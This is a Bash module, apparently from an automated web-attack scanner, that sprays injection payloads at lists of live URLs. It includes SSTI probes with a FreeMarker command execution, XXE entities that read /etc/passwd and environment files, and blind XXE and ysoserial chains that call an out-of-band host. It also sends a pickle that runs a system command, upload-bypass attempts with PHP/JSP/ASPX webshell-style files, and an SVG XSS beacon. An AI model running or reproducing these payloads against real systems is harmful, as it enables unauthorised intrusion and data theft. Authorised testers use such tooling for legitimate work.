#======================= PHASE 15: ADVANCED INJECTIONS (SSTI / XXE / DESERIAL / FILE UPLOAD) =======================
# SSTI detection, extended XXE, insecure deserialization, file upload bypass

_ssti_test_url() {
    local URL="$1"
    local INJ_DIR="$2"

    # Polyglot SSTI payloads — math eval detects most template engines
    local -a SSTI_PAYLOADS=(
        '{{7*7}}'
        '${7*7}'
        '#{7*7}'
        '<%= 7*7 %>'
        '{{7*"7"}}'
        '{7*7}'
        '[[7*7]]'
        '${{7*7}}'
        '{{config}}'
        '{{self}}'
        '${{"freemarker.template.utility.Execute"?new()("id")}}'
        '{{"".__class__.__mro__[1].__subclasses__()}}'
        '{% debug %}'
        '*{7*7}'
        '@{7*7}'
        '#{7*7}'
    )

    local BASELINE
    BASELINE=$(curl_safe -sk -o /dev/null -w "%{http_code}:%{size_download}" "$URL" 2>/dev/null || echo "000:0")

    for PAYLOAD in "${SSTI_PAYLOADS[@]}"; do
        local ENC
        ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" \
            "$PAYLOAD" 2>/dev/null || printf '%s' "$PAYLOAD")
        local INJECTED
        INJECTED=$(python3 -c "
import sys, re
url, enc = sys.argv[1], sys.argv[2]
print(re.sub(r'=[^&?#]*', lambda m: '=' + enc, url)[:3000])
" "$URL" "$ENC" 2>/dev/null) || INJECTED=$(printf '%s' "$URL" | head -c 3000)
        local RESP
        RESP=$(curl_safe -sk "$INJECTED" 2>/dev/null | head -c 2000)
        # Check if math evaluated (49 = 7*7)
        if echo "$RESP" | grep -qE "\b49\b"; then
            echo "SSTI: $INJECTED [payload: $PAYLOAD]" >> "$INJ_DIR/ssti_hits.txt"
            vuln "SSTI DETECTED: $URL | payload=$PAYLOAD"
            notify_vuln "critical" "SSTI: Template injection on $URL with $PAYLOAD → 49"
            return
        fi
    done
}

_ssti_phase() {
    local INJ_DIR="$1"
    local PARAM_FILE="$OUTDIR/urls/parameters.txt"

    [ -s "$PARAM_FILE" ] || { info "[SSTI] No parameter URLs found"; return; }

    log "[15.1] SSTI — testing $(wc -l < "$PARAM_FILE") parameter URLs..."
    local IDX=0
    while IFS= read -r PURL && [ $IDX -lt 150 ]; do
        IDX=$(( IDX + 1 ))
        progress_bar "SSTI" "$IDX" "150"
        _ssti_test_url "$PURL" "$INJ_DIR" &
        # Cap background jobs
        if [ $(( IDX % 20 )) -eq 0 ]; then wait; fi
    done < "$PARAM_FILE"
    wait
    echo ""
    local HIT
    HIT=$(wc -l < "$INJ_DIR/ssti_hits.txt" 2>/dev/null || echo 0)
    success "[15.1] SSTI scan done — $HIT hits"
}

_xxe_extended() {
    local INJ_DIR="$1"
    local ALIVE_FILE="$OUTDIR/alive/final_alive.txt"
    local OOB_REF="${OOB_DOMAIN:-oast.pro}"

    log "[15.2] Extended XXE (file read, SSRF, error-based)..."

    # File read payloads
    local -a XXE_FILE_PAYLOADS=(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>'
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>'
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><root>&xxe;</root>'
    )

    # Parameter Entity (blind) via OOB
    local -a XXE_PARAM_PAYLOADS=(
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://xxe.${OOB_REF}/evil.dtd\">%dtd;]><root/>"
        "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://xxe.${OOB_REF}/evil.dtd\"><root/>"
    )

    head -20 "$ALIVE_FILE" 2>/dev/null | while IFS= read -r URL; do
        for CType in "application/xml" "text/xml" "application/soap+xml"; do
            for PAYLOAD in "${XXE_FILE_PAYLOADS[@]}"; do
                local RESP
                RESP=$(curl_safe -s -X POST "$URL" \
                    -H "Content-Type: $CType" \
                    -d "$PAYLOAD" \
                    --max-time 8 2>/dev/null | head -c 3000)
                if echo "$RESP" | grep -qE "root:|nobody:|daemon:|www-data:|windows"; then
                    echo "XXE FILE READ: $URL [$CType]" >> "$INJ_DIR/xxe_hits.txt"
                    vuln "XXE FILE READ: $URL content type=$CType"
                    notify_vuln "critical" "XXE File Read: $URL → /etc/passwd or win.ini leaked"
                fi
            done
            for PAYLOAD in "${XXE_PARAM_PAYLOADS[@]}"; do
                curl_safe -s -X POST "$URL" \
                    -H "Content-Type: $CType" \
                    -d "$PAYLOAD" \
                    -o /dev/null 2>/dev/null &
            done
        done

        # Excel/XLSX XXE (file upload endpoints)
        local XLSX_XXE='<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        curl_safe -s -X POST "${URL%/}/import" \
            -F "file=@-;filename=payload.xlsx" \
            --data-binary "$XLSX_XXE" \
            -o /dev/null 2>/dev/null &
    done
    wait
    local HIT
    HIT=$(wc -l < "$INJ_DIR/xxe_hits.txt" 2>/dev/null || echo 0)
    success "[15.2] XXE extended — $HIT file read hits"
}

_deserial_test() {
    local INJ_DIR="$1"
    local ALIVE_FILE="$OUTDIR/alive/final_alive.txt"
    local OOB_REF="${OOB_DOMAIN:-oast.pro}"

    log "[15.3] Insecure Deserialization detection..."

    # Java deserialization magic bytes (base64)
    local JAVA_SERIAL_B64="rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAABc3IADmphdmEubGFuZy5PYmoAAAAAAAAAAHh4"
    # PHP object injection (common gadget chains)
    local PHP_SERIAL='O:8:"stdClass":1:{s:4:"test";s:4:"test";}'
    # Python pickle exploit marker
    local PYTHON_PICKLE_B64="Y29zCnN5c3RlbQooUydpZCcKdFIu"

    head -30 "$ALIVE_FILE" 2>/dev/null | while IFS= read -r URL; do
        # Java RMI / serialized object in POST body
        curl_safe -s -X POST "$URL" \
            -H "Content-Type: application/octet-stream" \
            -H "Accept: application/x-java-serialized-object" \
            --data-binary "$(echo "$JAVA_SERIAL_B64" | base64 -d 2>/dev/null || true)" \
            -o /dev/null -w "%{http_code}" 2>/dev/null | grep -qE "^5" && \
            echo "Possible Java deserial endpoint: $URL" >> "$INJ_DIR/deserial_candidates.txt" || true

        # PHP unserialize in GET params (common param names)
        for PARAM in "data" "obj" "object" "payload" "session" "token" "user"; do
            local RESP_CODE
            RESP_CODE=$(curl_safe -sk -o /dev/null -w "%{http_code}" \
                "${URL}?${PARAM}=${PHP_SERIAL}" 2>/dev/null || echo "000")
            if [[ "$RESP_CODE" =~ ^5 ]]; then
                echo "PHP deserial candidate: ${URL}?${PARAM}=..." >> "$INJ_DIR/deserial_candidates.txt"
            fi
        done

        # Check for Python pickle via multipart upload
        curl_safe -s -X POST "$URL" \
            -F "data=@-;filename=data.pkl" \
            --data-binary "$(echo "$PYTHON_PICKLE_B64" | base64 -d 2>/dev/null || true)" \
            -o /dev/null 2>/dev/null &
    done
    wait

    # Use ysoserial payloads if available
    if command -v ysoserial &>/dev/null && [ -n "$OOB_DOMAIN" ]; then
        log "[15.3] ysoserial OOB payloads..."
        for CHAIN in CommonsCollections1 CommonsCollections6 Spring1; do
            ysoserial "$CHAIN" "curl http://deserial.${OOB_DOMAIN}/java-${CHAIN}" 2>/dev/null \
                > "$INJ_DIR/yso_${CHAIN}.bin" || true
        done
    fi

    local CAND
    CAND=$(wc -l < "$INJ_DIR/deserial_candidates.txt" 2>/dev/null || echo 0)
    success "[15.3] Deserialization — $CAND candidates identified"
}

_file_upload_bypass() {
    local INJ_DIR="$1"
    local ALIVE_FILE="$OUTDIR/alive/final_alive.txt"

    log "[15.4] File upload vulnerability testing..."

    # Common upload endpoint paths
    local -a UPLOAD_PATHS=(
        "/upload" "/api/upload" "/file/upload" "/uploads" "/media/upload"
        "/api/v1/upload" "/api/v2/upload" "/avatar" "/profile/photo"
        "/attachment" "/api/files" "/cdn/upload"
    )

    # Webshell content (harmless detection payload — just echoes a string)
    local PHP_WEBSHELL='<?php echo "VULN-FILEUPLOAD-" . md5("test") . "\n"; ?>'
    local JSP_WEBSHELL='<% out.println("VULN-FILEUPLOAD-" + "jsp"); %>'
    local ASPX_WEBSHELL='<%@ Page Language="C#" %><% Response.Write("VULN-FILEUPLOAD-aspx"); %>'

    head -20 "$ALIVE_FILE" 2>/dev/null | while IFS= read -r BASEURL; do
        BASEURL="${BASEURL%/}"
        for UPATH in "${UPLOAD_PATHS[@]}"; do
            local TARGET="${BASEURL}${UPATH}"

            # Extension bypass techniques
            # 1. Double extension
            curl_safe -s -X POST "$TARGET" \
                -F "file=@-;filename=test.php.jpg" \
                --data-binary "$PHP_WEBSHELL" \
                -o "$INJ_DIR/upload_resp_$$.txt" 2>/dev/null
            if grep -q "VULN-FILEUPLOAD" "$INJ_DIR/upload_resp_$$.txt" 2>/dev/null; then
                echo "UPLOAD BYPASS (double ext): $TARGET" >> "$INJ_DIR/upload_hits.txt"
                vuln "FILE UPLOAD BYPASS: $TARGET accepts double extension .php.jpg"
                notify_vuln "critical" "File Upload Bypass: $TARGET allows PHP execution via .php.jpg"
            fi
            rm -f "$INJ_DIR/upload_resp_$$.txt"

            # 2. Null byte bypass
            curl_safe -s -X POST "$TARGET" \
                -F "file=@-;filename=test.php%00.jpg" \
                --data-binary "$PHP_WEBSHELL" \
                -o /dev/null 2>/dev/null &

            # 3. MIME type mismatch (PHP with image/jpeg)
            curl_safe -s -X POST "$TARGET" \
                -F "file=@-;filename=test.php;type=image/jpeg" \
                --data-binary "$PHP_WEBSHELL" \
                -o /dev/null 2>/dev/null &

            # 4. Uppercase extension
            curl_safe -s -X POST "$TARGET" \
                -F "file=@-;filename=test.PHP" \
                --data-binary "$PHP_WEBSHELL" \
                -o /dev/null 2>/dev/null &

            # 5. SVG with XSS (stored XSS via file upload)
            local SVG_XSS='<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//xss.'${OOB_DOMAIN:-oast.pro}'/svg")</script></svg>'
            curl_safe -s -X POST "$TARGET" \
                -F "file=@-;filename=test.svg;type=image/svg+xml" \
                --data-binary "$SVG_XSS" \
                -o /dev/null 2>/dev/null &
        done
    done
    wait

    local HIT
    HIT=$(wc -l < "$INJ_DIR/upload_hits.txt" 2>/dev/null || echo 0)
    success "[15.4] File upload bypass — $HIT confirmed hits"
}

_template_injection_headers() {
    local INJ_DIR="$1"
    local ALIVE_FILE="$OUTDIR/alive/final_alive.txt"

    log "[15.5] SSTI via HTTP headers..."
    local -a SSTI_HDR_PAYLOADS=('{{7*7}}' '${7*7}' '#{7*7}' '*{7*7}')

    head -20 "$ALIVE_FILE" 2>/dev/null | while IFS= read -r URL; do
        for PAYLOAD in "${SSTI_HDR_PAYLOADS[@]}"; do
            local RESP
            RESP=$(curl_safe -sk \
                -H "User-Agent: $PAYLOAD" \
                -H "X-Custom-Header: $PAYLOAD" \
                -H "Referer: http://$PAYLOAD.example.com" \
                "$URL" 2>/dev/null | head -c 2000)
            if echo "$RESP" | grep -qE "\b49\b"; then
                echo "SSTI via Header: $URL | payload=$PAYLOAD" >> "$INJ_DIR/ssti_hits.txt"
                vuln "SSTI VIA HEADER: $URL (payload: $PAYLOAD → 49)"
                notify_vuln "critical" "SSTI via Header: $URL evaluates $PAYLOAD in HTTP header"
            fi
        done
    done
}

phase_15_injections2() {
    if phase_done "phase_15"; then return 0; fi
    [ "$SSTI_XXE_MODE" -ne 1 ] && { info "SSTI/XXE mode disabled — skipping phase 15"; return; }
    phase_banner "PHASE 15: ADVANCED INJECTIONS (SSTI / XXE / DESERIAL / FILE UPLOAD)"

    local START_TIME
    START_TIME=$(date +%s)
    local INJ_DIR="$OUTDIR/advanced/injections"
    mkdir -p "$INJ_DIR"

    : > "$INJ_DIR/ssti_hits.txt"
    : > "$INJ_DIR/xxe_hits.txt"
    : > "$INJ_DIR/deserial_candidates.txt"
    : > "$INJ_DIR/upload_hits.txt"

    _ssti_phase "$INJ_DIR"
    _template_injection_headers "$INJ_DIR"
    _xxe_extended "$INJ_DIR"
    _deserial_test "$INJ_DIR"
    _file_upload_bypass "$INJ_DIR"

    local SSTI_CNT XXE_CNT DESER_CNT UPLOAD_CNT
    SSTI_CNT=$(wc -l < "$INJ_DIR/ssti_hits.txt" 2>/dev/null || echo 0)
    XXE_CNT=$(wc -l < "$INJ_DIR/xxe_hits.txt" 2>/dev/null || echo 0)
    DESER_CNT=$(wc -l < "$INJ_DIR/deserial_candidates.txt" 2>/dev/null || echo 0)
    UPLOAD_CNT=$(wc -l < "$INJ_DIR/upload_hits.txt" 2>/dev/null || echo 0)

    success "PHASE 15 DONE — SSTI: $SSTI_CNT | XXE: $XXE_CNT | Deserial: $DESER_CNT | Upload: $UPLOAD_CNT | Time: $(( $(date +%s) - START_TIME ))s"
    notify "Phase 15: Injections2 done — SSTI=$SSTI_CNT XXE=$XXE_CNT Deserial=$DESER_CNT Upload=$UPLOAD_CNT" "💉"
    mark_done "phase_15"
    echo ""
}
